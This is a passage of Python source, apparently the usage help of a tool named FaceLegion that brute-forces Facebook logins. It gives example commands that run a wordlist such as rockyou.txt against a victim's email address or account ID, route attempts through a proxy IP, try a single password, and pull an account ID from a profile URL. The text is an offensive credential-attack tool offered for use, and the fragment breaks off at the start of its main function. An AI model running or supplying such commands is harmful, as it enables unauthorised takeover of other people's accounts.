...
#### FaceLegion Brute Force Function ####
...
Examples:
        |
     |--------
     | python FaceLegion.py -t victim@gmail.com -w /usr/share/wordlists/rockyou.txt
     |--------
     | python FaceLegion.py -t 100001013078780 -w C:\\Users\\Me\\Desktop\\wordlist.txt
     |--------
     | python FaceLegion.py -t victim@hotmail.com -w D:\\wordlist.txt -p 35.236.37.121 default(port=8080,80) 
     |--------
     | python FaceLegion.py -t victim@gmail.com -s 1234567
     |-------- 
     | python FaceLegion.py -g https://www.facebook.com/alanwalker97 
     |-------- 
""")
def Main():
